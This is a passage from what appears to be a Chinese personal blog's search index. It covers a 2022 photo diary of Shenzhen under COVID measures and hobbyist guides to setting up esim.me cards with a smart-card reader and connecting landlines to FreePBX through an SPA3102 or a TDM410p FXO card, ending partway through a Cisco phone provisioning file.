","permalink":"https://blog.sparktour.me/posts/2022/12/31/2022-in-photos/","summary":"\u003cp\u003e\u003cem\u003e所有照片按照时间排列。由于\u003cdel\u003e嫌麻烦\u003c/del\u003e，照片都没有做过任何后期处理，权当是记录一下我的2022吧。\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202212_stopped_pcr_station.jpg\" alt=\"2022年12月，共存后被拆除的核酸采样点\"  /\u003e\n    \u003cfigcaption\u003e2022年12月，共存后被拆除的核酸采样点\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202201_quarantine_room.jpg\" alt=\"1月，学校的隔离宿舍\"  /\u003e\n    \u003cfigcaption\u003e1月，学校的隔离宿舍\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202201_hongshulin.jpg\" alt=\"1月，沿红树林出海口向南望\"  /\u003e\n    \u003cfigcaption\u003e1月，沿红树林出海口向南望\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202202_shenzhen_north.jpg\" alt=\"2月，地铁6号线上看到的深圳北站日落\"  /\u003e\n    \u003cfigcaption\u003e2月，地铁6号线上看到的深圳北站日落\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202203_covid_gift.jpg\" alt=\"3月，深圳封城时社区发的「大礼包」，内容是若干个苹果和饼干\"  /\u003e\n    \u003cfigcaption\u003e3月，深圳封城时社区发的「大礼包」，内容是若干个苹果和饼干\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202203_pcr_ad.jpg\" alt=\"3月，印着和广播着「快来做核酸」的宣传车\"  /\u003e\n    \u003cfigcaption\u003e3月，印着和广播着「快来做核酸」的宣传车\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202203_yantian.jpg\" alt=\"3月，盐田的海面上被拉上了黄色的围栏，据说是为了防止香港偷渡。\"  /\u003e\n    \u003cfigcaption\u003e3月，盐田的海面上被拉上了黄色的围栏，据说是为了防止香港偷渡。\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202204_delivery_man_and_barrier.jpg\" alt=\"4月，一名外卖员站在被封控居民楼的围墙外\"  /\u003e\n    \u003cfigcaption\u003e4月，一名外卖员站在被封控居民楼的围墙外\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202205_collapsed_bond_edu.jpg\" alt=\"5月，倒闭的邦德教育（深圳一家本土义务教育阶段培训机构）某校区\"  /\u003e\n    \u003cfigcaption\u003e5月，倒闭的邦德教育（深圳一家本土义务教育阶段培训机构）某校区\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202205_sustech_center.jpg\" alt=\"5月，南科大中心的傍晚\"  /\u003e\n    \u003cfigcaption\u003e5月，南科大中心的傍晚\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202206_dananshan.jpg\" alt=\"6月，从大南山上向南望，可以看到南山区，青山发电厂和香港机场\"  /\u003e\n    \u003cfigcaption\u003e6月，从大南山上向南望，可以看到南山区，青山发电厂和香港机场\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202206_shenzhenbay_searchlight.jpg\" alt=\"6月，深圳湾公园的探照灯，用于夜间搜索偷渡者\"  /\u003e\n    \u003cfigcaption\u003e6月，深圳湾公园的探照灯，用于夜间搜索偷渡者\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202207_futian_hk.jpg\" alt=\"7月，从福田向南望香港新界的山丘\"  /\u003e\n    \u003cfigcaption\u003e7月，从福田向南望香港新界的山丘\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202207_guaduate_ceremony.jpg\" alt=\"7月，南科大的毕业典礼\"  /\u003e\n    \u003cfigcaption\u003e7月，南科大的毕业典礼\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202207_xiamen.jpg\" alt=\"8月，厦门机场旁的一处城中村\"  /\u003e\n    \u003cfigcaption\u003e8月，厦门机场旁的一处城中村\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202208_pcr_line_baoneng_center.jpg\" alt=\"8月，宝能城核酸点\"  /\u003e\n    \u003cfigcaption\u003e8月，宝能城核酸点\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202208_pcr_line_civic_center.jpg\" alt=\"8月，市民中心内部供工作人员使用的核酸点\"  /\u003e\n    \u003cfigcaption\u003e8月，市民中心内部供工作人员使用的核酸点\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202208_shenzhen_bay_port.jpg\" alt=\"8月，深圳湾口岸\"  /\u003e\n    \u003cfigcaption\u003e8月，深圳湾口岸\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202211_dianzishaobing.jpg\" alt=\"11月，高交会山一家展销「电子哨兵」的商家\"  /\u003e\n    \u003cfigcaption\u003e11月，高交会山一家展销「电子哨兵」的商家\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202212_stopped_pcr_station.jpg\" alt=\"12月，共存后被拆除的核酸采样点\"  /\u003e\n    \u003cfigcaption\u003e12月，共存后被拆除的核酸采样点\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/2022-in-photos/202212_macau.jpg\" alt=\"12月，澳门新葡京\"  /\u003e\n    \u003cfigcaption\u003e12月，澳门新葡京\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e","title":"照片里的2022"},{"content":"最近从群友处得到了数张esim.me的「可拆卸eSIM卡」。简而言之，这种esim卡被制造成普通sim卡的形态，因此能够直接插入任意支持物理sim卡的手机，并通过esim.me提供的android app为esim卡添加profile。\n尽管esim.me在销售这些esim卡时，根据每个esim卡能够加入的profile数量区分了不同的价格档位。后续在网上查阅博客文章时，有人也提到这些不同价格的esim卡的硬件是完全一致的，esim.me只是通过手机配置app对不同价位的卡进行了软件上的限制。并且如果将这些esim卡插入支持esim的LTE模块，即可直接通过Windows的esim管理界面添加和删除profile。不过目前支持esim的LTE模块主要为移远的RM-50xQ系列（二手价格550元）和戴尔的dw5821e（二手价格300元）/dw5829e模块。为了配置esim卡而专门采购这些LTE模块显然有些得不偿失。\n2024年9月更新：持有可移除esim的用户可以考虑使用 MiniLPA，功能相比truephone提供的演示性质的LPAdesktop完善很多。 Truphone/LPAdesktop 在互联网上进一步搜索之后，笔者注意到了Truphone/LPAdesktop这款桌面软件，他的手册中提到其可以通过PC/SC智能卡读卡器配置这些esim卡。而目前市面上的智能卡读卡器普遍只需30-50元左右即可购买，相比于购买LTE模块划算了很多。\n环境准备 PC/SC读卡器一台（可以在淘宝上搜智能卡读卡器/PCSC读卡器/健保卡读卡器等），读卡器的样子大概跟电信营业厅写卡的设备差不多。一般支持PC/SC通用驱动的读卡器在Windows和Mac下都是免驱的。 如果要在Linux下连接读卡器，可以参考这篇文章配置，主要是需要安装pcscd和添加读卡器的vendorID和prductID。 jre环境 编译安装 参考Github上用docker-compose编译即可，需要注意的是LPADesktop里的webcam组件 https://github.com/sarxos/webcam-capture/ 不兼容arm的设备，如果需要运行在arm的设备上，可以考虑注释掉和webcam有关的组件（为此笔者修改了一个不带webcam组件的版本，可以在 https://github.com/sparkcyf/LPAdesktop/releases/ 下载）\n使用 安装jre后，在目录下运行java -jar LPA-1.0.0.0-jar-with-dependencies.jar即可：\n程序UI 确认程序能识别到读卡器后点connect即可看到esim的信息和现在已经安装的profile：\nesim卡的信息 右键不同的profile即可激活/反激活/删除profile。\n如果需要添加新的profile，可以点右下角的download，之后手动输入profile的信息：\n添加profile 如果扫描配置二维码得到的字符串类似于1$prod.smdp-plus.rsp.goog$052X-UFXS-CQIY-PNGL，则Matching id填写052X-UFXS-CQIY-PNGL，server url填写prod.smdp-plus.rsp.goog即可。\n其他 如果身边有较新的，root了的android设备，也可以尝试使用 PeterCxy/OpenEUICC 的软件直接在手机里配置，已经有人为其制作了magisk模块：https://github.com/AndroPlus-org/magisk-module-openeuicc\n参考 eSIM.me SIM Card with Windows | zero log\neSIM.me を Windows 11 の LPA で使用する\nPeterCxy/OpenEUICC\n","permalink":"https://blog.sparktour.me/posts/2022/11/20/configure-esim-me-card-with-pc-sc-reader/","summary":"\u003cp\u003e最近从群友处得到了数张\u003ca href=\"https://esim.me\"\u003eesim.me\u003c/a\u003e的「可拆卸eSIM卡」。简而言之，这种esim卡被制造成普通sim卡的形态，因此能够直接插入任意支持物理sim卡的手机，并通过esim.me提供的android app为esim卡添加profile。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003cp\u003e尽管esim.me在销售这些esim卡时，根据每个esim卡能够加入的profile数量区分了不同的价格档位。后续在网上查阅博客文章时，有人也提到这些不同价格的esim卡的硬件是完全一致的，esim.me只是通过手机配置app对不同价位的卡进行了软件上的限制。并且如果将这些esim卡插入支持esim的LTE模块，即可直接\u003ca href=\"https://support.microsoft.com/en-us/windows/use-an-esim-to-get-a-cellular-data-connection-on-your-windows-pc-0e255714-f8be-b9ef-9e84-f75b05ed98a3\"\u003e通过Windows的esim管理界面添加和删除profile\u003c/a\u003e。不过目前支持esim的LTE模块主要为移远的\u003ca href=\"https://www.quectel.com/product/5g-rm50xq-series\"\u003eRM-50xQ系列\u003c/a\u003e（二手价格550元）和戴尔的dw5821e（二手价格300元）/dw5829e模块。为了配置esim卡而专门采购这些LTE模块显然有些得不偿失。\u003c/p\u003e","title":"通过PC/SC智能卡读卡器配置esim.me的SIM卡"},{"content":"在本篇文章中，笔者尝试使用Linksys (CISCO / SIPURA) SPA3102连接固话网络并接入freepbx，将固定电话的信号转换为了VoIP（SIP）协议。本文的效果与《使用FXO卡配合asterisk及freepbx将固定电话信号转为VoIP》一文中的类似。\nspa3102 硬件 运行freepbx的虚拟机一台 Linksys SPA3102，二手价大约100-200元 SPA3102配置 可参考 SPA3102的quick start手册，说明书和下方笔者的截图，由于笔者不使用LINE1（FXS端口），因此本文仅着重于讲解FXO（PSTN）部份的配置（笔者也没有配置spa3102的Line1部份），其他部分读者可以对照截图修改。\nSIP sip Regional regional regional2 Provisioning provisioning PSTN Line 需要修改的配置如下：\n配置 内容 备注 Proxy: freepbx的ip地址 Register: NO freepbx中按照ip地址白名单进行鉴权 Display Name: 自行设置 之后会显示于freepbx的来点显示中 User ID: 自行设置 之后会显示于freepbx的来点显示中 Dial Plan 2: (S0\u0026lt;:123456\u0026gt;) 将123456改为PSTN侧的电话或其他唯一的识别号码，之后会成为freepbx中的callerid。 PSTN Caller Default DP: 2 Disconnect Tone: 450@-30,450@-30;2(.35/.35/1+2) 中国大陆的挂断音（busy tone），用于在用户挂机之后主动挂断sip连接，错误配置可能会导致sip没法挂断PSTN侧的电话。其他地区可以在ITU的文档中找，并参考cisco的编码规则定义 pstn User user1 pstn-user1 Freepbx侧 新建一个名为spa3102的 SIP pjsp trunk（名字可以自选） 设置Maximum Channels为1 在pjsp settings中： Authentication和Registration都选None SIP Server配置为SPA3102的IP地址 SIP Server Port 和SPA3102的PSTN Line配置界面中的SIP Port一致（笔者都用了5062） 随后配置相应的inbound route和outbound route即可。在配置完成后，freepbx的asterisk log中可以看到如VERBOSE[16022] res_pjsip/pjsip_options.c: Contact spa3102/sip:\u0026lt;spa3102's ip\u0026gt;:5062 is now Reachable. RTT: 8.340 msec的信息。\n参考 https://kceng123.blogspot.com/2014/06/spa3102-with-freepbx-setup-purpose-of.html https://community.freepbx.org/t/ata-linksys-spa3102-pjsip-trunk-and-caller-id/68401 https://community.freepbx.org/t/spa3102-cid/61874 ","permalink":"https://blog.sparktour.me/posts/2022/10/15/voip-fxo-via-linksys-spa3102/","summary":"\u003cp\u003e在本篇文章中，笔者尝试使用Linksys (CISCO / SIPURA) SPA3102连接固话网络并接入freepbx，将固定电话的信号转换为了VoIP（SIP）协议。本文的效果与\u003ca href=\"/posts/2022/10/14/voip-fxo-via-asterisk-freepbx-dahdi/\"\u003e《使用FXO卡配合asterisk及freepbx将固定电话信号转为VoIP》\u003c/a\u003e一文中的类似。\u003c/p\u003e","title":"配置 Linksys SPA3102 并接入固定电话网"},{"content":"在本篇文章中，笔者尝试使用TDM410p FXO卡和freepbx，将固定电话的信号转换为了VoIP（SIP）协议，并使用SIP话机接打电话。\n所需硬件 FXO卡一块，比较便宜的解决方案是TDM410p，红色的是FXO卡（接墙上的电话线），绿色的是FXS卡（接电话机终端），我们所需的是FXO卡，购买前需要注意有些卡是PCI接口的，可能需要另外买PCI转PCIe的转接卡。淘宝上的单口FXO卡大约200元一块。笔者买了某淘宝店的单口FXO组合板（一张PCI接口的单口FXO卡，和一张PCI转PCIe转接卡组合在了一起） 主机一台，由于TDM410p的硬件规格太老，似乎无法在PVE上进行pcie直通，因此笔者用了一台旧电脑直接安装了FreePBX发行版。（根据网上的讨论，fxo及freepbx对机器的性能要求很低，甚至十多年前的酷睿2+2G内存都能正常运行） *（可选）*若干台IP电话，可在闲鱼上以「思科/Cisco IP电话」之类的关键词搜索。大概能搜到60-100元一台的CP7900或CP8900系列的电话机，价格甚至比某些接RJ11的传统电话机还便宜。 配置 FXO卡 FXO卡的硬件是通过dahdi进行驱动的，freepbx已经自带了这些驱动，理论上插上fxo卡之后，dahdi就能识别出来了。同时，我们也可以通过dahdi_scan来验证一下：\n[root@freepbx]# dahdi_scan [1] active=yes alarms=OK description=Wildcard TDM410P name=WCTDM/0 manufacturer=Digium devicetype=Wildcard TDM410P location=PCI Bus 03 Slot 01 basechan=1 totchans=4 irq=0 type=analog port=1,FXO port=2,none port=3,none port=4,none 在freepbx网页界面的Connectivity-DAHDI Configuration，在弹出的提示里点enable，然后重载asterisk和dahdi。\n如果确认卡能识别出来的话，随后运行dahdi_genconf -vv，dahdi会生成asterisk需要的一些channel配置文件（如/etc/asterisk/dahdi-channels.conf），我们还需要在/etc/asterisk/chan_dahdi_channels_custom.conf里添加一行#include dahdi-channels.conf （这行很可能在freepbx重载的时候被删掉，如果遇到了打出电话的时候提示no channel available之类的错误的话，可以检查一下）。\n#include dahdi-channels.conf 此时我们可以在命令行界面进入asterisk的命令行（asterisk -rvvv），检查一下dahdi的channel运行状态：\nfreepbx*CLI\u0026gt; dahdi show channels Chan Extension Context Language MOH Interpret Blocked In Service Description pseudo default default Yes 1 from-analog cn default Yes 修改callerid的识别方式 这一步主要是为了让asterisk能识别出打进来电话的callerid（呼叫方的电话号码），一般中国大陆使用的callerid广播方法主要是FSK和DTMF两种。如果不清楚运营商用的是哪种callerid的话，可以用dahdi_monitor 1 -v -r rx.wav -t tx.wav的命令对FXO口录音，随后给FXO口对应的电话打一个电话，并用软件观察录制的波形。具体的波形例子可以在这个链接里找到。由于笔者这边的运营商使用的是FSK（特征是先有若干个小峰，0.5秒左右后跟着一个一个听起来很像宽带拨号声音的音频），因此我们需要在DAHDI Configuration的页面右边的Global Settings里添加（或修改）以下项目：\ncidsignalling=bell cidstart=ring opermode=CHINA 随后在System Settings里面把tone reigon改成China，添加：\ndefaultzone=cn loadzone=cn 保存并重启asterisk和dahdi，如果不放心也可以在命令行运行fwconsole restart重启整个freepbx服务。\n随后的配置和笔者的上一篇文章类似，添加extension（分机），trunk（选dahdi trunk），inbound route和outbound route即可。\n连接Cisco IP电话（可选） 为cisco ip电话建立的extension（分机）需要用chan_sip（而不是pjsp）建立才能正常拨打和接听电话。chan_sipe可以在freepbx的Settings-Advanced settings-SIP Channel Driver里启用（设置成both即可）。 升级电话为SIP固件 先去Cisco的支持网站下载固件（需要注册一个免费的账号，下载固件选择SIP固件，zip结尾的）。\n下载后解压为如下形式：\n. ├── BOOT894x.0-0-2-0.bin.sgn ├── SIP894x.9-4-2SR3-1.bin1.sgn ├── SIP894x.9-4-2SR3-1.bin10.sgn ├── SIP894x.9-4-2SR3-1.bin11.sgn ├── SIP894x.9-4-2SR3-1.bin2.sgn ├── SIP894x.9-4-2SR3-1.bin3.sgn ├── SIP894x.9-4-2SR3-1.bin4.sgn ├── SIP894x.9-4-2SR3-1.bin5.sgn ├── SIP894x.9-4-2SR3-1.bin6.sgn ├── SIP894x.9-4-2SR3-1.bin7.sgn ├── SIP894x.9-4-2SR3-1.bin8.sgn ├── SIP894x.9-4-2SR3-1.bin9.sgn ├── SIP894x.9-4-2SR3-1.loads 随后在此文件夹里新建一个名为XMLDefault.cnf.xml的文件，内容如下，并把需要升级的电话机型号那一行的内容改成上面固件的前缀（比如笔者需要用上面的固件升级CP 8945，那就修改\u0026lt;loadInformation585 model=\u0026quot;Cisco 8945\u0026quot;\u0026gt;SIP894x.9-4-2SR3-1\u0026lt;/loadInformation585\u0026gt;这一行，并把内容改成SIP894x.9-4-2SR3-1）：\n\u0026lt;Default\u0026gt; \u0026lt;autoRegistrationName\u0026gt;AUTO-REG\u0026lt;/autoRegistrationName\u0026gt; \u0026lt;autoRegistration\u0026gt;disabled\u0026lt;/autoRegistration\u0026gt; \u0026lt;selfProvisioningSecureMode\u0026gt;true\u0026lt;/selfProvisioningSecureMode\u0026gt; \u0026lt;adminProvisionMode\u0026gt;false\u0026lt;/adminProvisionMode\u0026gt; \u0026lt;ipAddressMode\u0026gt;0\u0026lt;/ipAddressMode\u0026gt; \u0026lt;ipPreferenceModeControl\u0026gt;0\u0026lt;/ipPreferenceModeControl\u0026gt; \u0026lt;ipMediaAddressFamilyPreference\u0026gt;0\u0026lt;/ipMediaAddressFamilyPreference\u0026gt; \u0026lt;callManagerGroup\u0026gt; \u0026lt;name\u0026gt;Default\u0026lt;/name\u0026gt; \u0026lt;tftpDefault\u0026gt;true\u0026lt;/tftpDefault\u0026gt; \u0026lt;members\u0026gt; \u0026lt;member priority=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;callManager\u0026gt; \u0026lt;name\u0026gt;cucmpub1\u0026lt;/name\u0026gt; \u0026lt;description\u0026gt;cucmpub1\u0026lt;/description\u0026gt; \u0026lt;ports\u0026gt; \u0026lt;ethernetPhonePort\u0026gt;2000\u0026lt;/ethernetPhonePort\u0026gt; \u0026lt;sipPort\u0026gt;5060\u0026lt;/sipPort\u0026gt; \u0026lt;securedSipPort\u0026gt;5061\u0026lt;/securedSipPort\u0026gt; \u0026lt;mgcpPorts\u0026gt; \u0026lt;listen\u0026gt;2427\u0026lt;/listen\u0026gt; \u0026lt;keepAlive\u0026gt;2428\u0026lt;/keepAlive\u0026gt; \u0026lt;/mgcpPorts\u0026gt; \u0026lt;/ports\u0026gt; \u0026lt;processNodeName\u0026gt;cucmpub1\u0026lt;/processNodeName\u0026gt; \u0026lt;/callManager\u0026gt; \u0026lt;/member\u0026gt; \u0026lt;/members\u0026gt; \u0026lt;/callManagerGroup\u0026gt; \u0026lt;TVS\u0026gt; \u0026lt;members\u0026gt; \u0026lt;member priority=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;port\u0026gt;2445\u0026lt;/port\u0026gt; \u0026lt;address\u0026gt;cucmpub1\u0026lt;/address\u0026gt; \u0026lt;/member\u0026gt; \u0026lt;/members\u0026gt; \u0026lt;/TVS\u0026gt; \u0026lt;loadInformation548 model=\u0026#34;Cisco 6911\u0026#34;\u0026gt;SCCP6911.9-3-1-SR2-3\u0026lt;/loadInformation548\u0026gt; \u0026lt;loadInformation497 model=\u0026#34;Cisco 6961\u0026#34;\u0026gt;SCCP69xx.9-4-1-3SR2\u0026lt;/loadInformation497\u0026gt; \u0026lt;loadInformation614 model=\u0026#34;Cisco TelePresence Profile 52 Dual (C60)\u0026#34;\u0026gt;\u0026lt;/loadInformation614\u0026gt; \u0026lt;loadInformation616 model=\u0026#34;Cisco TelePresence Profile 65 Dual (C90)\u0026#34;\u0026gt;\u0026lt;/loadInformation616\u0026gt; \u0026lt;loadInformation558 model=\u0026#34;Cisco TelePresence 400\u0026#34;\u0026gt;\u0026lt;/loadInformation558\u0026gt; \u0026lt;loadInformation557 model=\u0026#34;Cisco TelePresence 200\u0026#34;\u0026gt;\u0026lt;/loadInformation557\u0026gt; \u0026lt;loadInformation628 model=\u0026#34;IMS-integrated Mobile (Basic)\u0026#34;\u0026gt;\u0026lt;/loadInformation628\u0026gt; \u0026lt;loadInformation30006 model=\u0026#34;Cisco 7970\u0026#34;\u0026gt;SCCP70.9-4-2SR1-1S\u0026lt;/loadInformation30006\u0026gt; \u0026lt;loadInformation684 model=\u0026#34;Cisco 8851\u0026#34;\u0026gt;sip88xx.11-5-1-18\u0026lt;/loadInformation684\u0026gt; \u0026lt;loadInformation593 model=\u0026#34;Cisco Cius\u0026#34;\u0026gt;\u0026lt;/loadInformation593\u0026gt; \u0026lt;loadInformation520 model=\u0026#34;Cisco TelePresence 1100\u0026#34;\u0026gt;\u0026lt;/loadInformation520\u0026gt; \u0026lt;loadInformation592 model=\u0026#34;Cisco 3905\u0026#34;\u0026gt;CP3905.9-4-1SR2-2\u0026lt;/loadInformation592\u0026gt; \u0026lt;loadInformation36217 model=\u0026#34;Cisco 8811\u0026#34;\u0026gt;sip88xx.11-5-1-18\u0026lt;/loadInformation36217\u0026gt; \u0026lt;loadInformation36225 model=\u0026#34;Cisco 8865\u0026#34;\u0026gt;sip8845_65.11-5-1-18\u0026lt;/loadInformation36225\u0026gt; \u0026lt;loadInformation36213 model=\u0026#34;Cisco 7811\u0026#34;\u0026gt;sip78xx.11-5-1-18\u0026lt;/loadInformation36213\u0026gt; \u0026lt;loadInformation645 model=\u0026#34;Universal Device Template\u0026#34;\u0026gt;\u0026lt;/loadInformation645\u0026gt; \u0026lt;loadInformation36207 model=\u0026#34;Cisco TelePresence MX700\u0026#34;\u0026gt;\u0026lt;/loadInformation36207\u0026gt; \u0026lt;loadInformation115 model=\u0026#34;Cisco 7941\u0026#34;\u0026gt;SCCP41.9-4-2SR1-1S\u0026lt;/loadInformation115\u0026gt; \u0026lt;loadInformation480 model=\u0026#34;Cisco TelePresence 3200\u0026#34;\u0026gt;\u0026lt;/loadInformation480\u0026gt; \u0026lt;loadInformation648 model=\u0026#34;Cisco Unified Communications for RTX\u0026#34;\u0026gt;\u0026lt;/loadInformation648\u0026gt; \u0026lt;loadInformation30016 model=\u0026#34;Cisco IP Communicator\u0026#34;\u0026gt;\u0026lt;/loadInformation30016\u0026gt; \u0026lt;loadInformation36043 model=\u0026#34;Cisco DX70\u0026#34;\u0026gt;\u0026lt;/loadInformation36043\u0026gt; \u0026lt;loadInformation30032 model=\u0026#34;SCCP gateway virtual phone\u0026#34;\u0026gt;\u0026lt;/loadInformation30032\u0026gt; \u0026lt;loadInformation496 model=\u0026#34;Cisco 6941\u0026#34;\u0026gt;SCCP69xx.9-4-1-3SR2\u0026lt;/loadInformation496\u0026gt; \u0026lt;loadInformation610 model=\u0026#34;Cisco TelePresence Profile 42 (C20)\u0026#34;\u0026gt;\u0026lt;/loadInformation610\u0026gt; \u0026lt;loadInformation36227 model=\u0026#34;Cisco TelePresence MX800 Dual\u0026#34;\u0026gt;\u0026lt;/loadInformation36227\u0026gt; \u0026lt;loadInformation478 model=\u0026#34;Cisco TelePresence 1000\u0026#34;\u0026gt;\u0026lt;/loadInformation478\u0026gt; \u0026lt;loadInformation308 model=\u0026#34;Cisco 7961G-GE\u0026#34;\u0026gt;SCCP41.9-4-2SR1-1S\u0026lt;/loadInformation308\u0026gt; \u0026lt;loadInformation540 model=\u0026#34;Cisco 8961\u0026#34;\u0026gt;sip8961.9-4-2SR2-2\u0026lt;/loadInformation540\u0026gt; \u0026lt;loadInformation309 model=\u0026#34;Cisco 7941G-GE\u0026#34;\u0026gt;SCCP41.9-4-2SR1-1S\u0026lt;/loadInformation309\u0026gt; \u0026lt;loadInformation613 model=\u0026#34;Cisco TelePresence Profile 52 (C60)\u0026#34;\u0026gt;\u0026lt;/loadInformation613\u0026gt; \u0026lt;loadInformation30019 model=\u0026#34;Cisco 7936\u0026#34;\u0026gt;cmterm_7936.3-3-21-0\u0026lt;/loadInformation30019\u0026gt; \u0026lt;loadInformation481 model=\u0026#34;Cisco TelePresence 500-37\u0026#34;\u0026gt;\u0026lt;/loadInformation481\u0026gt; \u0026lt;loadInformation12 model=\u0026#34;Cisco ATA 186\u0026#34;\u0026gt;ATA030204SCCP090202A\u0026lt;/loadInformation12\u0026gt; \u0026lt;loadInformation36216 model=\u0026#34;Cisco 8821\u0026#34;\u0026gt;\u0026lt;/loadInformation36216\u0026gt; \u0026lt;loadInformation412 model=\u0026#34;Cisco 3951\u0026#34;\u0026gt;SIP3951.8-1-4a\u0026lt;/loadInformation412\u0026gt; \u0026lt;loadInformation690 model=\u0026#34;Cisco TelePresence MX300 G2\u0026#34;\u0026gt;\u0026lt;/loadInformation690\u0026gt; \u0026lt;loadInformation583 model=\u0026#34;Generic Multiple Screen Room System\u0026#34;\u0026gt;\u0026lt;/loadInformation583\u0026gt; \u0026lt;loadInformation365 model=\u0026#34;Cisco 7921\u0026#34;\u0026gt;CP7921G-1.4.6.3\u0026lt;/loadInformation365\u0026gt; \u0026lt;loadInformation30035 model=\u0026#34;IP-STE\u0026#34;\u0026gt;\u0026lt;/loadInformation30035\u0026gt; \u0026lt;loadInformation586 model=\u0026#34;Cisco 8941\u0026#34;\u0026gt;SCCP894x.9-4-2SR2-2\u0026lt;/loadInformation586\u0026gt; \u0026lt;loadInformation369 model=\u0026#34;Cisco 7906\u0026#34;\u0026gt;SCCP11.9-4-2SR1-1S\u0026lt;/loadInformation369\u0026gt; \u0026lt;loadInformation582 model=\u0026#34;Generic Single Screen Room System\u0026#34;\u0026gt;\u0026lt;/loadInformation582\u0026gt; \u0026lt;loadInformation30018 model=\u0026#34;Cisco 7961\u0026#34;\u0026gt;SCCP41.9-4-2SR1-1S\u0026lt;/loadInformation30018\u0026gt; \u0026lt;loadInformation550 model=\u0026#34;Cisco ATA 187\u0026#34;\u0026gt;ATA187.9-2-3-1\u0026lt;/loadInformation550\u0026gt; \u0026lt;loadInformation608 model=\u0026#34;Cisco TelePresence Codec C40\u0026#34;\u0026gt;\u0026lt;/loadInformation608\u0026gt; \u0026lt;loadInformation36210 model=\u0026#34;Cisco TelePresence IX5000\u0026#34;\u0026gt;\u0026lt;/loadInformation36210\u0026gt; \u0026lt;loadInformation681 model=\u0026#34;Cisco ATA 190\u0026#34;\u0026gt;ATA190.1-2-2-003\u0026lt;/loadInformation681\u0026gt; \u0026lt;loadInformation495 model=\u0026#34;Cisco 6921\u0026#34;\u0026gt;SCCP69xx.9-4-1-3SR2\u0026lt;/loadInformation495\u0026gt; \u0026lt;loadInformation633 model=\u0026#34;Cisco TelePresence Profile 42 (C40)\u0026#34;\u0026gt;\u0026lt;/loadInformation633\u0026gt; \u0026lt;loadInformation585 model=\u0026#34;Cisco 8945\u0026#34;\u0026gt;SIP894x.9-4-2SR3-1\u0026lt;/loadInformation585\u0026gt; \u0026lt;loadInformation689 model=\u0026#34;Cisco TelePresence MX200 G2\u0026#34;\u0026gt;\u0026lt;/loadInformation689\u0026gt; \u0026lt;loadInformation446 model=\u0026#34;Cisco 3911\u0026#34;\u0026gt;SIP3951.8-1-4a\u0026lt;/loadInformation446\u0026gt; \u0026lt;loadInformation682 model=\u0026#34;Cisco TelePresence SX10\u0026#34;\u0026gt;\u0026lt;/loadInformation682\u0026gt; \u0026lt;loadInformation606 model=\u0026#34;Cisco TelePresence Codec C90\u0026#34;\u0026gt;\u0026lt;/loadInformation606\u0026gt; \u0026lt;loadInformation521 model=\u0026#34;Transnova 